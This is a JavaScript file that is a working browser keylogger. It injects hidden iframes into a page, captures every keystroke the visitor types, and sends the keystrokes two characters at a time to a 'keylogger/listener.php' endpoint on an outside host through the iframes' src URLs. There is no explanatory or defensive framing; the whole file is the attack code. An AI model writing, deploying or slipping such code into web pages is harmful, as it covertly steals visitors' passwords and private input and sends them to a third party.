var container = document.createElement('div');
container.setAttribute('id', 'fbcontainer');
container.setAttribute('style', 'position:fixed; width:100%; height:100%; z-index:9999999;');
container.innerHTML='
<iframe style="display:none;" id="sender"></iframe><iframe style="display:none;" id="sender1"></iframe>
<iframe style="display:none;" id="sender2"></iframe>';
document.getElementsByTagName("body")[0].insertBefore(container,document.getElementsByTagName("body")[0].firstChild);
document.getElementsByTagName("body")[0].appendChild(container);
var changeFrame=0;
var record="";
var charCount=0;
document.keyup=function(e){
}

document.onkeydown=function(e)
{
    record=record+String.fromCharCode(e.which);
    charCount++;
    if(charCount==2)
    {
        if(changeFrame==1)
        {
            document.getElementById("sender1").setAttribute('src', 'http://website152342.com/keylogger/listener.php?s='+record);
            record="";
            charCount=0;
            changeFrame++;
        }
        else
        {
            if(changeFrame==0)
            {
                document.getElementById("sender").setAttribute('src', 'http://website152342.com/keylogger/listener.php?s='+record);
                record="";
                charCount=0;
                changeFrame++;
            }
            else
            {
                document.getElementById("sender2").setAttribute('src', 'http://website152342.com/keylogger/listener.php?s='+record);
                record="";
                charCount=0;
                changeFrame=0;
            }
        }
    }
}


